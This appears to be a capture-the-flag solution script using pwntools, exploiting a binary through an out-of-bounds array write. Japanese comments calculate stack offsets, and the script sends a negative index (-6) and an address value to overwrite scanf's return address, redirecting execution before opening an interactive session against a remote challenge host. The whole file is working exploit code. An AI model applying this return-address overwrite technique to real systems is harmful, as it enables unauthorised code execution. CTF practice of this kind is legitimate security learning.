#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")

context.log_level = 'info'
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
host = '34.170.146.252'
port = 5594

gdbscript = '''
break *main+4
c
'''


def conn():
    match args.TYPE:
        case 'REMOTE':
            r = remote(host, port)
        case 'DBG':
            r = gdb.debug([exe.path], gdbscript)
        case _:
            r = process([exe.path])

    return r

# callはリターンアドレスを保存するために現在のrspから8バイト減らす。
# 今のrspはrbp-0x1b0 callによりscanfのリターンアドレスはrbp-0x1b0-0x08
# 配列の先頭アドレスはrbp-0x1a0からscanfのリターンアドレスを引いて配列の先頭アドレスからの相対位置がわかる
def main():
    r = conn()

    r.sendlineafter(b"pos > ", b"-6")
    r.sendlineafter(b"val > ", b'4198870')

    r.interactive()


if __name__ == "__main__":
    main()
